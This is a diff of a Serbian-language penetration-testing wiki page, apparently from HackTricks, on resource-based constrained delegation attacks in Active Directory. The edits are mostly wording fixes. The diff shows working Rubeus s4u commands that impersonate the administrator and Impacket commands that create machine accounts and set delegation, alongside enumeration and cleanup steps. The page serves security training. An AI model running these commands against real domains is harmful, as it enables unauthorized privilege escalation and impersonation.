@@ -22,15 +22,15 @@ Međutim, ako je **TGS** korišćen u **S4U2Proxy** **NISU Forwardable** pokuša
 
 > Ako imate **dozvole za pisanje ekvivalentne privilegijama** nad **računom računara** možete dobiti **privilegovan pristup** na toj mašini.
 
-Pretpostavimo da napadač već ima **dozvole za pisanje ekvivalentne privilegijama nad žrtvinim računarom**.
+Pretpostavimo da napadač već ima **dozvole za pisanje ekvivalentne privilegijama nad računarom žrtve**.
 
 1. Napadač **kompromituje** nalog koji ima **SPN** ili **kreira jedan** (“Service A”). Imajte na umu da **bilo koji** _Admin User_ bez bilo kojih drugih posebnih privilegija može **kreirati** do 10 objekata računara (**_MachineAccountQuota_**) i postaviti im **SPN**. Tako da napadač može jednostavno kreirati objekat računara i postaviti SPN.
-2. Napadač **zloupotrebljava svoje DOZVOLE ZA PISANJE** nad žrtvinim računarom (ServiceB) da konfiguriše **resource-based constrained delegation da omogući ServiceA da imituje bilo kog korisnika** protiv tog žrtvinog računara (ServiceB).
+2. Napadač **zloupotrebljava svoje DOZVOLE ZA PISANJE** nad računarom žrtve (ServiceB) da konfiguriše **resource-based constrained delegation da omogući ServiceA da imituje bilo kog korisnika** protiv tog računara žrtve (ServiceB).
 3. Napadač koristi Rubeus da izvede **potpun S4U napad** (S4U2Self i S4U2Proxy) od Service A do Service B za korisnika **sa privilegovanim pristupom Service B**.
-1. S4U2Self (iz SPN kompromitovanog/kreativnog naloga): Traži **TGS od Administratora za mene** (Ne Forwardable).
-2. S4U2Proxy: Koristi **ne Forwardable TGS** iz prethodnog koraka da zatraži **TGS** od **Administratora** za **žrtvinsku mašinu**.
+1. S4U2Self (iz SPN kompromitovanog/kreativnog naloga): Traži **TGS od Administratora za mene** (Nije Forwardable).
+2. S4U2Proxy: Koristi **ne Forwardable TGS** iz prethodnog koraka da zatraži **TGS** od **Administratora** za **računar žrtve**.
 3. Čak i ako koristite ne Forwardable TGS, pošto zloupotrebljavate Resource-based constrained delegation, to će raditi.
-4. Napadač može **proći kroz tiket** i **imitirati** korisnika da dobije **pristup žrtvinskoj ServiceB**.
+4. Napadač može **proći kroz tiket** i **imitirati** korisnika da dobije **pristup žrtvi ServiceB**.
 
 Da biste proverili _**MachineAccountQuota**_ domena možete koristiti:
 ```bash
@@ -76,12 +76,12 @@ Prvo, kreirali smo novi objekat Računar sa lozinkom `123456`, tako da nam je po
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
-Ovo će ispisati RC4 i AES hešove za taj nalog.\
+Ovo će ispisati RC4 i AES heš vrednosti za taj nalog.\
 Sada se napad može izvršiti:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-Možete generisati više tiketa za više usluga jednostavno postavljanjem jednog zahteva koristeći `/altservice` parametar Rubeus:
+Možete generisati više tiketa za više usluga jednostavno postavljajući pitanje jednom koristeći `/altservice` parametar Rubeus:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
@@ -90,7 +90,7 @@ rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:admin
 
 ### Linux alati: end-to-end RBCD sa Impacket-om (2024+)
 
-Ako radite sa Linux-om, možete izvršiti celu RBCD liniju koristeći zvanične Impacket alate:
+Ako radite sa Linux-om, možete izvršiti celu RBCD lanac koristeći zvanične Impacket alate:
 ```bash
 # 1) Create attacker-controlled machine account (respects MachineAccountQuota)
 impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'
@@ -121,11 +121,11 @@ ls \\victim.domain.local\C$
 ```
 ### Zloupotreba različitih servisnih karata
 
-Saznajte više o [**dostupnim servisnim kartama ovde**](silver-ticket.md#available-services).
+Saznajte o [**dostupnim servisnim kartama ovde**](silver-ticket.md#available-services).
 
 ## Enumeracija, revizija i čišćenje
 
-### Enumerisanje računara sa RBCD konfigurisanom
+### Enumeracija računara sa RBCD konfigurisanom
 
 PowerShell (dekodiranje SD-a za rešavanje SID-ova):
 ```powershell
@@ -143,7 +143,7 @@ try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $n
 }
 }
 ```
-Impacket (čitati ili isprazniti jednim komandama):
+Impacket (čitati ili isprazniti jednim komandom):
 ```bash
 # Read who can delegate to VICTIM
 impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
@@ -178,11 +178,13 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 
 - Takođe možete napisati RBCD SD preko AD Web Services (ADWS) ako je LDAP filtriran. Vidi:
 
+
 {{#ref}}
 adws-enumeration.md
 {{#endref}}
 
-- Kerberos relays lanci često se završavaju u RBCD kako bi se postigao lokalni SYSTEM u jednom koraku. Vidi praktične primere od kraja do kraja:
+- Kerberos relay lanci često se završavaju u RBCD-u kako bi se postigao lokalni SYSTEM u jednom koraku. Vidi praktične primere od kraja do kraja:
+
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
@@ -197,5 +199,6 @@ adws-enumeration.md
 - [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
 - Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
 - Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
+
 
 {{#include ../../banners/hacktricks-training.md}}
